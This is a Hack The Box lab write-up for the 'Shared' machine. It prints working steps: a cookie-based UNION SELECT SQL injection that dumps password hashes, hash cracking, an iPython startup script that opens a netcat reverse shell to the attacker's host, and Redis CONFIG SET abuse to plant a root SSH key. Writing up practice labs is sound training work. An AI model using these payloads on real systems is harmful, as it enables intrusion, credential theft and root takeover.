# Hack The Box: Shared

**Difficulty:** Medium
**OS:** Linux

Shared is a Medium-level Linux machine highlighting vulnerabilities within e-commerce platforms and development environments. The initial compromise is achieved by exploiting an SQL injection vulnerability located within a tracking cookie on a checkout subdomain, which allows for the extraction of user credentials. Privilege escalation involves pivoting between multiple user accounts by exploiting a misconfigured Jupyter (iPython) environment, followed by reverse-engineering a compiled binary to extract hardcoded Redis credentials and leveraging Redis to execute commands as root.

---

## Reconnaissance

The assessment begins with an Nmap scan to enumerate the available network services.

```bash
nmap -p- --min-rate 10000 10.10.11.172
nmap -p 22,80,443 -sCV 10.10.11.172
```

The scan identifies three open ports:
*   **Port 22:** SSH (OpenSSH 8.4p1 Debian)
*   **Port 80:** HTTP (nginx 1.18.0)
*   **Port 443:** HTTPS (nginx 1.18.0)

Accessing the web server via HTTP or HTTPS redirects to `https://shared.htb`. Inspecting the TLS certificate on port 443 reveals it is a wildcard certificate for `*.shared.htb`.

We add `shared.htb` to our `/etc/hosts` file. Given the wildcard certificate, we also perform subdomain fuzzing using `wfuzz` or `ffuf`.

```bash
wfuzz -u https://10.10.11.172 -H "Host: FUZZ.shared.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 169
```

This enumeration reveals an active subdomain: `checkout.shared.htb`. We append this to our `/etc/hosts` file as well.

## Web Exploitation

Navigating to `shared.htb` reveals an e-commerce platform. Adding an item to the shopping cart initiates a POST request and sets a cookie named `custom_cart`. 

The cookie's value is URL-encoded JSON representing the product ID and quantity:
```json
{"53GG2EF8":"1"}
```

When proceeding to the checkout process on `checkout.shared.htb`, the application reads this cookie to query the database and render the cart items.

### Exploiting SQL Injection

We intercept the request to `checkout.shared.htb` using Burp Suite and manipulate the `custom_cart` cookie. 

By modifying the product ID within the JSON payload and appending a single quote (`'`), the product fails to load. Appending a SQL comment (`'-- -`) restores the product loading. This behavior strongly suggests the presence of a SQL injection vulnerability within the product ID parameter during the database query.

```json
{"53GG2EF8'-- -":"1"}
```

To exploit this, we use a `UNION SELECT` injection to extract data from the database. We systematically determine the number of columns returned by the original query (which turns out to be 3) and locate which column's data is reflected on the webpage.

```json
{"53GG2EF8' UNION SELECT 1,2,3-- -":"1"}
```

Once the vulnerable column is identified, we extract the database schema, table names, and eventually the contents of the `user` table.

```json
{"53GG2EF8' UNION SELECT 1,username,password FROM user-- -":"1"}
```

The SQL injection yields an MD5 hash for the user `james_mason`.

### Cracking the Hash

We use a tool like Hashcat or John the Ripper with the `rockyou.txt` wordlist to crack the MD5 password hash.

```bash
hashcat -m 0 hash.txt rockyou.txt
```

The hash cracks successfully, revealing the plaintext password.

## Initial Access

We use the recovered credentials to authenticate against the SSH service.

```bash
ssh james_mason@10.10.11.172
# Authentication successful
```
We retrieve the `user.txt` flag from the home directory.

## Lateral Movement

Enumerating the system as `james_mason`, we analyze group memberships and running processes. We identify that `james_mason` belongs to a specific developer group and has write access to an `/opt` directory containing scripts executed by another user, `dan_smith`.

Specifically, we find a scheduled task or cron job running an iPython script owned by `dan_smith`. 

### Exploiting iPython (CVE-2022-21699)

The iPython environment executed by `dan_smith` is vulnerable to arbitrary code execution due to how it handles profile directories (CVE-2022-21699). Because `james_mason` has write permissions to the directory where the iPython process is invoked, we can create a malicious profile script.

We create a directory structure matching the expected iPython configuration path (`profile_default/startup/`) and place a Python script inside it containing a reverse shell payload.

```python
# payload.py inside the startup directory
import os
os.system("nc -e /bin/sh 10.10.14.X 9999")
```

When the scheduled task runs the iPython script as `dan_smith`, it automatically loads and executes our malicious startup script.

```bash
nc -lnvp 9999
# Connection received
id
# uid=1001(dan_smith)
```

## Privilege Escalation

As `dan_smith`, we continue enumerating the system. We discover a custom compiled binary, `redis_connector_dev`, located in `/usr/local/bin` or a similar directory.

### Reverse Engineering the Binary

We download the binary to our attacking machine for analysis. Running `strings` on the binary suggests it connects to a local Redis instance. 

To determine the connection details and credentials, we disassemble the binary using Ghidra or dynamically analyze it using `ltrace` or `strace` (if executed on the target).

```bash
ltrace ./redis_connector_dev
```

The analysis reveals the hardcoded password used by the binary to authenticate to the Redis service running on `localhost`.

### Exploiting Redis for Root Access

Armed with the Redis password, we connect to the local Redis instance.

```bash
redis-cli -a <Extracted_Password>
```

Because Redis is running as `root`, we can exploit it to execute system commands or modify files. A common technique is to abuse Redis's ability to save its database to disk, allowing us to overwrite the `authorized_keys` file for the root user.

1.  We generate an SSH key pair locally.
2.  We set a Redis key containing our public key, surrounded by newlines.
3.  We configure Redis to save its database to `/root/.ssh/`.
4.  We set the database filename to `authorized_keys`.
5.  We trigger a database save.

```text
127.0.0.1:6379> set mykey "\n\nssh-rsa AAAA... attacker@kali\n\n"
127.0.0.1:6379> config set dir /root/.ssh/
127.0.0.1:6379> config set dbfilename authorized_keys
127.0.0.1:6379> save
```

With our public key now in the `root` user's `authorized_keys` file, we SSH into the machine directly as root.

```bash
ssh -i private_key root@10.10.11.172
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
